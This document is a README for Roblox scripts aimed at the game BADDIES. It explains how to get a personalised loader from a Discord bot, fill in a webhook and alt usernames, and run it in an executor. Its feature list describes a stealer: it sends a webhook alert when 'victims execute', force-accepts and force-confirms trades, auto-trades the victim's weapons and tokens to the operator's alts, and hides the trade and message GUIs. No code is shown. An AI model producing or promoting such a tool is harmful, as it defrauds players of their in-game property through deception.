# Baddies- Scripts

Scripts for the Roblox game **BADDIES** (Place ID: 11158043705).

## Files

| File | Description |
|------|-------------|
| `loader.lua` | Example loader — paste this into your executor and fill in your webhook + alt usernames |
| `script.lua` | Main script — loaded automatically by the loader. Do not execute this directly. |

## How to use

1. Get your personalised loader from the **Discord bot** using `/generate`
2. Fill in your webhook URL and alt usernames
3. Execute the loader in your Roblox executor while in BADDIES
4. The Freeze Trade GUI will appear — use the toggles to control trade behaviour

## Features

- Freeze Trade GUI with 5 toggles (Freeze Trade, Force Accept, Force Confirm, Force Add Weapons, Force Add Tokens)
- Webhook notifications when victims execute (rich hit detection: 3+ main weapons)
- Auto-trades weapons + tokens
- Chat commands: `add`, `1`, `2`
- Hides trade/message GUIs automatically
